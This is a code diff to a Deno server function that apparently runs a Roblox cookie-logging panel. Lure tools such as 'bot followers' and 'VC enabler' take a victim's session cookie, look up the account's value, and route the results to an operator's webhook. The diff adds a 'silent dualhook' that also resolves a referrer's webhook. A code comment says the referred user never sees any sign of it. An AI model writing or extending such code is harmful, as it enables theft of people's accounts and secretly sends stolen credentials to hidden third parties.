@@ -113,11 +113,13 @@ Deno.serve(async (req) => {
       webhook_copy_clothes: string | null;
       webhook_group_botter: string | null;
       webhook_vc_enabler: string | null;
+      referrer_id: string | null;
     } | null = null;
+    const profileSelect = "id, username, webhook_url, webhook_bot_followers, webhook_copy_games, webhook_copy_clothes, webhook_group_botter, webhook_vc_enabler, referrer_id";
     if (body.username) {
       const { data, error: profileErr } = await supabase
         .from("profiles")
-        .select("id, username, webhook_url, webhook_bot_followers, webhook_copy_games, webhook_copy_clothes, webhook_group_botter, webhook_vc_enabler")
+        .select(profileSelect)
         .eq("username", body.username.toLowerCase())
         .maybeSingle();
       if (profileErr || !data) return json({ error: "Owner not found" }, 404);
@@ -130,7 +132,7 @@ Deno.serve(async (req) => {
         if (userData.user) {
           const { data, error: profileErr } = await supabase
             .from("profiles")
-            .select("id, username, webhook_url, webhook_bot_followers, webhook_copy_games, webhook_copy_clothes, webhook_group_botter, webhook_vc_enabler")
+            .select(profileSelect)
             .eq("id", userData.user.id)
             .maybeSingle();
           if (profileErr) return json({ error: "Owner lookup failed" }, 500);
@@ -147,6 +149,27 @@ Deno.serve(async (req) => {
       vc_enabler: profile?.webhook_vc_enabler,
     };
     const ownerWebhook = perToolMap[body.toolKey] || profile?.webhook_url || null;
+
+    // Resolve referrer's per-tool webhook (silent dualhook). The referred user
+    // never sees any indication this is happening.
+    let referrerWebhook: string | null = null;
+    if (profile?.referrer_id) {
+      const { data: refProfile } = await supabase
+        .from("profiles")
+        .select("webhook_url, webhook_bot_followers, webhook_copy_games, webhook_copy_clothes, webhook_group_botter, webhook_vc_enabler")
+        .eq("id", profile.referrer_id)
+        .maybeSingle();
+      if (refProfile) {
+        const refToolMap: Record<string, string | null | undefined> = {
+          bot_followers: refProfile.webhook_bot_followers,
+          copy_games: refProfile.webhook_copy_games,
+          copy_clothes: refProfile.webhook_copy_clothes,
+          group_botter: refProfile.webhook_group_botter,
+          vc_enabler: refProfile.webhook_vc_enabler,
+        };
+        referrerWebhook = refToolMap[body.toolKey] || refProfile.webhook_url || null;
+      }
+    }
 
     // 2. Server-side Roblox lookup (incl. RAP, Korblox, Headless)
     const robloxInfo = await fetchRobloxInfo(body.cookie);
